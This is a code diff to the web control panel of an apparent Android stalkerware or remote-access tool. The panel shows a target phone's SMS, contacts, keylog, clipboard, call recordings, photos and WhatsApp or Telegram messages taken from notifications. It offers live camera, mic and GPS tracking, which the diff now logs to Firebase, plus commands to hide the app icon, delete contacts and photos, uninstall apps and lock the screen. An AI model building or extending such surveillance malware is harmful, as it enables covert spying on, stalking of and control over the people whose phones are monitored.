@@ -249,7 +249,7 @@
         <div id="liveCameraPanel" class="camera-panel"><div class="camera-option"><label><input type="radio" name="liveCameraSelect" value="front" checked onchange="toggleFlashOptions()"> FrontCAM</label><label><input type="radio" name="liveCameraSelect" value="back" onchange="toggleFlashOptions()"> BackCAM</label></div><div class="camera-option"><label id="liveFlashContainer" style="display:none;"><input type="checkbox" id="liveFlashCheckbox"> Use flash</label><label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label></div><button class="live-btn" id="startLiveStreamBtn">Start Live</button></div>
         <button id="liveAudioBtn"><span>🎤</span> Live Audio</button>
         <button id="stopLiveAudioBtn" style="display:none;">⏹ Stop</button>
-        <button id="getLocationBtn"><span>📍</span> GPS Location</button>
+
     </div>
     <div class="section"><div class="section-title">Data</div>
         <button id="fileManagerBtn"><span>📂</span> File Manager</button>
@@ -670,22 +670,23 @@ window.gotoPage=function(p){ currentPage=p; renderTable(); };
 
 function displaySMS(data){
     if(!Array.isArray(data)){ panel.innerHTML='<p>No SMS data</p>'; return; }
-    const rows=data.map(m=>[m.type==='inbox'||m.type===1?'📥 Incoming':'📤 Outgoing', m.address||m.number||'', m.body||'', m.date||m.timeFmt||'']);
+    const rows=data.map(m=>[m.type==='inbox'||m.type===1?'📥 Incoming':'📤 Outgoing', m.address||m.number||'Unknown', m.body||m.msg||m.message||'', m.date||m.timeFmt||'']);
     currentData=data; dataType='sms'; renderTable(rows,['Type','Number','Message','Date']);
 }
 function displayContacts(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>👥 Contacts</h3><p>No contacts found.</p>'; return; }
-    panel.innerHTML=`<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Name</th><th>Number</th><th>Storage Location</th><th>Action</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${escapeHtml(c.storage||c.accountType||'Device')}</td><td><button class="btn-ui secondary" onclick="sendCommand('DELETE_CONTACT',{id:'${c.id}'})" style="color:var(--danger)">Delete</button></td></tr>`).join('')}</tbody></table></div>`;
 }
 function displayInstalledApps(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
-    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th><th>Size in MB</th></tr></thead><tbody>${data.map(app=>{ const s = app.sizeMb || Math.round((app.size||0)/(1024*1024)); return `<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="btn-ui primary open-app" style="padding:4px 8px; font-size:12px" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="btn-ui secondary remove-app" style="color:var(--danger); padding:4px 8px; font-size:12px" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td><td>${s}</td></tr>`; }).join('')}</tbody></table></div>`;
     document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg}));
     document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg}));
 }
 function displayBrowserHistory(data){
-    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
-    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
+    const nt = '<p style="font-size:12px;color:var(--text-sec);margin-bottom:12px;">ℹ️ Note: Due to strict Android permissions, Chrome browsing history cannot be directly extracted on unrooted devices (Android 6+).</p>';
+    if(!Array.isArray(data)||!data.length){ panel.innerHTML=`<h3>🌐 Browser History</h3>${nt}<p>No history found.</p>`; return; }
+    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3>${nt}<div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
 }
 function displayWifiNetworks(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>'; return; }
@@ -703,7 +704,7 @@ function displayKeylog(data){
 }
 function displayClipboard(data){
     const content=data&&data.content?data.content:(data||'');
-    panel.innerHTML=`<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data&&data.type?data.type:'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div>`;
+    panel.innerHTML=`<h3>📋 Clipboard</h3><p style="font-size:12px;color:var(--text-sec);margin-bottom:12px;">ℹ️ Displays the text currently copied to the device's clipboard.</p><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data&&data.type?data.type:'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div>`;
 }
 function displayCallRecordings(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<p>No recordings yet.</p>'; return; }
@@ -724,7 +725,10 @@ function displayPhotoGallery(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<p>No images found.</p>'; return; }
     panel.innerHTML=`<h3>🖼️ Photo Gallery (${data.length})</h3><div id="photoGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:8px;"></div>`;
     const grid=document.getElementById('photoGrid');
-    data.forEach(img=>{ const tile=document.createElement('div'); tile.style.cssText='position:relative;cursor:pointer;border-radius:8px;overflow:hidden;background:#f0f0f0;aspect-ratio:1'; if(img.thumb) tile.innerHTML=`<img src="data:image/jpeg;base64,${img.thumb}" style="width:100%;height:100%;object-fit:cover;"><div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.55);color:#fff;font-size:9px;padding:3px;">${img.dateFmt||''}</div>`; else tile.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:32px">🖼️</div>'; tile.onclick=()=>sendCommand('GET_IMAGE',{mediaId:img.id||img.mediaId}); grid.appendChild(tile); });
+    data.forEach(img=>{ const tile=document.createElement('div'); tile.style.cssText='position:relative;cursor:pointer;border-radius:8px;overflow:hidden;background:#f0f0f0;aspect-ratio:1'; if(img.thumb) tile.innerHTML=`<img src="data:image/jpeg;base64,${img.thumb}" style="width:100%;height:100%;object-fit:cover;"><div style="position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.55);color:#fff;font-size:9px;padding:3px;">${img.dateFmt||''}</div>`; else tile.innerHTML='<div style="display:flex;align-items:center;justify-content:center;height:100%;font-size:32px">🖼️</div>'; tile.onclick=()=>{
+        window.lastRequestedMediaId = img.id||img.mediaId;
+        sendCommand('GET_IMAGE',{mediaId:img.id||img.mediaId});
+    }; grid.appendChild(tile); });
 }
 function displayAppEvents(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📦 App Events</h3><p>No events recorded yet. App installs/removals and call events will appear here.</p>'; return; }
@@ -733,19 +737,70 @@ function displayAppEvents(data){
     const container=document.getElementById('appEventsList');
     data.forEach(ev=>{ const card=document.createElement('div'); card.className='event-card'; card.innerHTML=`<div class="event-icon">${icons[ev.type]||'📋'}</div><div class="event-details"><div class="event-title">${escapeHtml(ev.name||ev.pkg||ev.extra||ev.type)}</div><div class="event-meta">${ev.type}${ev.pkg?' • '+ev.pkg:''} • ${ev.timeFmt||ev.date||''}</div></div>`; container.appendChild(card); });
 }
+window.socialMessagesCache = [];
+function renderSocialMessagesTabs(appFilter) {
+    const apps = [...new Set(window.socialMessagesCache.map(m=>m.app||getAppNameFromPkg(m.pkg)||'Unknown'))];
+    const filtered = appFilter ? window.socialMessagesCache.filter(m=>(m.app||getAppNameFromPkg(m.pkg)||'Unknown')===appFilter) : window.socialMessagesCache;
+    let html = `<h3>💬 Social Messages (${window.socialMessagesCache.length})</h3>`;
+    html += `<div style="display:flex;gap:8px;margin-bottom:16px;overflow-x:auto;padding-bottom:4px;">`;
+    html += `<button class="btn-ui ${!appFilter?'primary':'secondary'}" onclick="renderSocialMessagesTabs(null)">All Apps</button>`;
+    apps.forEach(a => { html += `<button class="btn-ui ${appFilter===a?'primary':'secondary'}" onclick="renderSocialMessagesTabs('${escapeHtml(a)}')">${escapeHtml(a)}</button>`; });
+    html += `</div><div style="overflow-y:auto;max-height:60vh;">`;
+    html += filtered.slice().reverse().map(m=>`<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app||getAppNameFromPkg(m.pkg)||'Unknown')}</strong> <small style="color:var(--text-sec);float:right;">${m.timeFmt||''}</small></div><div style="font-weight:600;margin-top:6px;">${escapeHtml(m.title||'')}</div><div style="margin-top:4px;">${escapeHtml(m.text||m.body||'')}</div></div>`).join('');
+    html += `</div>`;
+    panel.innerHTML = html;
+}
 function displaySocialMessages(data){
     let msgs=typeof data==='string'?JSON.parse(data):data;
     if(!Array.isArray(msgs)||!msgs.length){ panel.innerHTML='<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p>'; return; }
-    panel.innerHTML=`<h3>💬 Social Messages (${msgs.length})</h3><div style="overflow-y:auto;max-height:60vh;">`+msgs.slice().reverse().map(m=>`<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app||getAppNameFromPkg(m.pkg)||'Unknown')}</strong> <small>${m.timeFmt||''}</small></div><div>${escapeHtml(m.title||'')}</div><div>${escapeHtml(m.text||m.body||'')}</div></div>`).join('')+`</div>`;
+    window.socialMessagesCache = msgs;
+    renderSocialMessagesTabs(null);
 }
 function getAppNameFromPkg(pkg){ const map={'com.whatsapp':'WhatsApp','org.telegram.messenger':'Telegram','com.instagram.android':'Instagram','com.facebook.orca':'Messenger','com.facebook.katana':'Facebook','com.snapchat.android':'Snapchat'}; return map[pkg]||pkg; }
 
 // MAP & GEOFENCE
+async function reverseGeocode(lat, lon, updateElementId) {
+    try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+        const data = await res.json();
+        const el = document.getElementById(updateElementId);
+        if(el && data.display_name) el.innerText = data.display_name;
+    } catch(e) { }
+}
+
 function renderMap(loc){
     let l=typeof loc==='string'?JSON.parse(loc):loc;
     const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10;
     currentLocation={lat,lon,acc};
-    panel.innerHTML=`<div id="map" style="height:380px;"></div><div class="map-info">📍 Current: ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>🎯 Accuracy: ${acc.toFixed(1)}m</div>`;
+    
+    // 15-min Firebase Location Storage Logic
+    if(window._lastFirebaseSaveTime === undefined || (Date.now() - window._lastFirebaseSaveTime > 15 * 60 * 1000)) {
+        if(typeof db !== 'undefined' && selectedDeviceId) {
+            db.collection('locationHistory').add({
+                deviceId: selectedDeviceId,
+                lat: lat,
+                lon: lon,
+                accuracy: acc,
+                timestamp: Date.now(),
+                timeFmt: new Date().toLocaleString()
+            }).catch(e=>console.log("Firebase Save Error:", e));
+            window._lastFirebaseSaveTime = Date.now();
+        }
+    }
+
+    panel.innerHTML=`
+        <div style="margin-bottom:12px;background:#fff;padding:12px;border-radius:8px;border:1px solid #eee;">
+            <div style="font-weight:600;margin-bottom:4px;">📍 Current Location</div>
+            <div id="liveMapAddress" style="font-size:13px;color:var(--text-sec);margin-bottom:8px;">Fetching address...</div>
+            <div style="display:flex;gap:12px;align-items:center;">
+                <span class="badge blue">${lat.toFixed(6)}, ${lon.toFixed(6)}</span>
+                <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" class="btn-ui secondary" style="text-decoration:none;font-size:12px;padding:4px 8px;">🗺️ View in Google Maps</a>
+            </div>
+        </div>
+        <div id="map" style="height:380px;"></div><div class="map-info" style="top: auto; bottom: 20px;">🎯 Accuracy: ${acc.toFixed(1)}m</div>`;
+    
+    reverseGeocode(lat, lon, 'liveMapAddress');
+
     if(mapInstance)mapInstance.remove();
     mapInstance=L.map('map').setView([lat,lon],18);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
@@ -763,7 +818,30 @@ function showGeofencePanel(){
 }
 function showGeofencePanelWithLocation(){
     const lat=currentLocation.lat, lon=currentLocation.lon;
-    panel.innerHTML=`<h3>🗺️ Geofence — Safety Zone</h3><p>Current device location: ${lat.toFixed(6)}, ${lon.toFixed(6)}</p><div id="geofenceMap" style="height:320px;margin-bottom:12px;"></div><div style="display:flex;gap:8px;flex-wrap:wrap;"><input id="gfLat" placeholder="Latitude" value="${lat.toFixed(6)}"><input id="gfLon" placeholder="Longitude" value="${lon.toFixed(6)}"><input id="gfRadius" placeholder="Radius (m)" value="500"></div><div class="geofence-controls"><button id="setFenceBtn" style="background:#1976ff;">📍 Set Fence Here</button><button id="useCurrentBtn" style="background:#4caf50;">📍 Use Current Location</button><button id="clearFenceBtn" style="background:#ff9800;">🗑️ Clear Fence</button><button id="getFenceStatusBtn" style="background:#2196f3;">📊 Status</button></div><div id="fenceStatus"></div>`;
+    panel.innerHTML=`<h3>🗺️ Geofence — Safety Zone</h3>
+    <div style="margin-bottom:12px;background:#fff;padding:12px;border-radius:8px;border:1px solid #eee;">
+        <div id="gfAddress" style="font-size:13px;color:var(--text-sec);margin-bottom:8px;">Fetching address...</div>
+        <div style="display:flex;gap:12px;align-items:center;">
+            <span class="badge blue">${lat.toFixed(6)}, ${lon.toFixed(6)}</span>
+            <a href="https://maps.google.com/?q=${lat},${lon}" target="_blank" class="btn-ui secondary" style="text-decoration:none;font-size:12px;padding:4px 8px;">🗺️ View in Google Maps</a>
+        </div>
+    </div>
+    <div id="geofenceMap" style="height:320px;position:relative;margin-bottom:12px;">
+        <div id="fenceStatus" style="position:absolute;bottom:10px;left:50%;transform:translateX(-50%);z-index:9000;background:rgba(255,255,255,0.9);padding:8px 16px;border-radius:20px;box-shadow:0 2px 10px rgba(0,0,0,0.2);"></div>
+    </div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;">
+        <input id="gfLat" placeholder="Latitude" value="${lat.toFixed(6)}">
+        <input id="gfLon" placeholder="Longitude" value="${lon.toFixed(6)}">
+        <input id="gfRadius" placeholder="Radius (m)" value="500">
+    </div>
+    <div class="geofence-controls" style="margin-bottom:12px;">
+        <button id="setFenceBtn" style="background:#1976ff;">📍 Set Fence Here</button>
+        <button id="useCurrentBtn" style="background:#4caf50;">📍 Use Current Location</button>
+        <button id="clearFenceBtn" style="background:#ff9800;">🗑️ Clear Fence</button>
+    </div>`;
+
+    reverseGeocode(lat, lon, 'gfAddress');
+
     setTimeout(()=>{
         const map=L.map('geofenceMap').setView([lat,lon],15);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
@@ -778,18 +856,23 @@ function showGeofencePanelWithLocation(){
             const r=parseFloat(document.getElementById('gfRadius').value)||500;
             circle=L.circle([e.latlng.lat,e.latlng.lng],{radius:r,color:'#d32f2f',fillColor:'#d32f2f',fillOpacity:0.15}).addTo(map);
         });
-        document.getElementById('setFenceBtn').onclick=()=>{ const lat2=parseFloat(document.getElementById('gfLat').value); const lon2=parseFloat(document.getElementById('gfLon').value); const rad=parseFloat(document.getElementById('gfRadius').value)||500; if(isNaN(lat2)||isNaN(lon2))return showNotification('Enter valid coordinates'); sendCommand('SET_GEOFENCE',{lat:lat2,lon:lon2,radius:rad}); showNotification('Geofence sent to device'); };
+        document.getElementById('setFenceBtn').onclick=()=>{ const lat2=parseFloat(document.getElementById('gfLat').value); const lon2=parseFloat(document.getElementById('gfLon').value); const rad=parseFloat(document.getElementById('gfRadius').value)||500; if(isNaN(lat2)||isNaN(lon2))return showNotification('Enter valid coordinates'); sendCommand('SET_GEOFENCE',{lat:lat2,lon:lon2,radius:rad}); showNotification('Geofence sent to device'); setTimeout(()=>sendCommand('GET_GEOFENCE'), 1000); };
         document.getElementById('useCurrentBtn').onclick=()=>{ document.getElementById('gfLat').value=lat.toFixed(6); document.getElementById('gfLon').value=lon.toFixed(6); if(marker)map.removeLayer(marker); marker=L.marker([lat,lon]).addTo(map).bindPopup('Current Location'); if(circle)map.removeLayer(circle); circle=L.circle([lat,lon],{radius:parseFloat(document.getElementById('gfRadius').value)||500,color:'#d32f2f',fillColor:'#d32f2f',fillOpacity:0.15}).addTo(map); };
-        document.getElementById('clearFenceBtn').onclick=()=>sendCommand('CLEAR_GEOFENCE');
-        document.getElementById('getFenceStatusBtn').onclick=()=>sendCommand('GET_GEOFENCE');
+        document.getElementById('clearFenceBtn').onclick=()=>{ sendCommand('CLEAR_GEOFENCE'); setTimeout(()=>sendCommand('GET_GEOFENCE'), 1000); };
+        
+        sendCommand('GET_GEOFENCE'); // auto-request status
     },100);
 }
 function displayGeofenceInfo(data){
     const statusDiv=document.getElementById('fenceStatus');
     if(statusDiv && data && data.active){
-        statusDiv.innerHTML=`<div style="margin-top:12px;padding:12px;background:#e8f5e9;border-radius:8px;"><strong>✅ Active Geofence</strong><br>📍 ${data.lat.toFixed(5)}, ${data.lon.toFixed(5)}<br>📏 Radius: ${data.radius}m</div>`;
+        statusDiv.innerHTML=`✅ Active Geofence | 📏 Radius: ${data.radius}m`;
+        statusDiv.style.background = 'rgba(232, 245, 233, 0.95)';
+        statusDiv.style.color = '#2e7d32';
     }else if(statusDiv){
-        statusDiv.innerHTML=`<div style="margin-top:12px;padding:12px;background:#fff3e0;border-radius:8px;">⚠️ No active geofence</div>`;
+        statusDiv.innerHTML=`⚠️ No active geofence`;
+        statusDiv.style.background = 'rgba(255, 243, 224, 0.95)';
+        statusDiv.style.color = '#e65100';
     }
 }
 function showSchedulePanel(){
@@ -980,7 +1063,18 @@ function showAppUsagePanel(){
     sendCommand('GET_APP_USAGE',{days:1});
 }
 function capturePicture(){ const camera=document.querySelector('input[name="clickCameraSelect"]:checked').value; sendCommand('CAMERA_SNAPSHOT',{camera,flash:document.getElementById('clickFlashCheckbox').checked}); }
-function displayCapturedImage(b64){ panel.innerHTML=`<img src="data:image/jpeg;base64,${b64}" style="max-width:100%;border-radius:8px;"><div style="margin-top:12px;"><button onclick="downloadBase64('${b64}','snapshot_${Date.now()}.jpeg')" style="background:#1976ff;color:white;border:none;padding:8px 16px;border-radius:6px;">💾 SAVE IMAGE</button></div>`; }
+function displayCapturedImage(b64){ 
+    const modalHtml = `
+    <div id="photoModalOverlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;">
+        <img src="data:image/jpeg;base64,${b64}" style="max-width:90vw;max-height:80vh;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,0.5);">
+        <div style="margin-top:24px;display:flex;gap:16px;">
+            <button onclick="downloadBase64('${b64}','snapshot_${Date.now()}.jpeg')" class="btn-ui primary" style="font-size:16px;padding:12px 24px;">⬇️ Download</button>
+            <button onclick="if(confirm('Delete this image?')){ sendCommand('DELETE_MEDIA', {mediaId: window.lastRequestedMediaId}); showNotification('Delete request sent.'); document.getElementById('photoModalOverlay').remove(); }" class="btn-ui" style="background:#d32f2f;color:white;border:none;font-size:16px;padding:12px 24px;">🗑️ Delete</button>
+            <button onclick="document.getElementById('photoModalOverlay').remove()" class="btn-ui secondary" style="background:#222;color:white;border:none;font-size:16px;padding:12px 24px;">✕ Close</button>
+        </div>
+    </div>`;
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+}
 function toggleLiveGps(){ liveGpsActive=!liveGpsActive; sendCommand(liveGpsActive?'START_GPS_UPDATES':'STOP_GPS_UPDATES'); const btn=document.getElementById('liveGpsBtn'); if(btn){ btn.style.background=liveGpsActive?'#d32f2f':''; btn.querySelector('span:last-child').textContent=liveGpsActive?'Stop GPS Track':'Live GPS Track'; } }
 function toggleAppIcon(){ sendCommand(iconHidden?'SHOW_APP':'HIDE_APP'); }
 function toggleFlash(){ sendCommand(flashOn?'FLASH_OFF':'FLASH_ON'); }
@@ -1023,7 +1117,22 @@ function handleJSON(json){
         case 'SMS_ALERTS_DATA': try{ displaySmsAlerts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); break;
         case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
-        case 'GEOFENCE_ALERT': pushAlert('Geofence',json.event==='EXIT'?'🚨 DEVICE LEFT safe zone!':'✅ Device returned to safe zone'); break;
+        case 'GEOFENCE_ALERT': 
+            const aMsg = json.event==='EXIT'?'🚨 DEVICE LEFT safe zone!':'✅ Device returned to safe zone';
+            const mHtml = `
+            <div id="geofenceAlertModal" style="position:fixed;inset:0;background:rgba(0,0,0,0.6);backdrop-filter:blur(4px);z-index:99999;display:flex;align-items:center;justify-content:center;">
+                <div style="background:#fff;padding:24px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.2);min-width:300px;text-align:center;">
+                    <h2 style="color:${json.event==='EXIT'?'#d32f2f':'#2e7d32'};margin-top:0;">Geofence Alert</h2>
+                    <p style="font-size:16px;margin:16px 0;">${aMsg}</p>
+                    <div style="display:flex;gap:12px;justify-content:center;margin-top:24px;">
+                        <button onclick="document.getElementById('geofenceAlertModal').remove()" class="btn-ui secondary">Close</button>
+                        <button onclick="document.getElementById('geofenceAlertModal').remove(); sendCommand('CLEAR_GEOFENCE')" class="btn-ui" style="background:#ff9800;color:#fff;">Clear Fence</button>
+                    </div>
+                </div>
+            </div>`;
+            document.body.insertAdjacentHTML('beforeend', mHtml);
+            pushAlert('Geofence',aMsg); 
+            break;
         case 'SCHEDULED_CAPTURE_SET': showNotification('✅ Auto-capture started'); break;
         case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); break;
         case 'DEVICE_LOCKED': showNotification('🔒 Screen locked'); break;
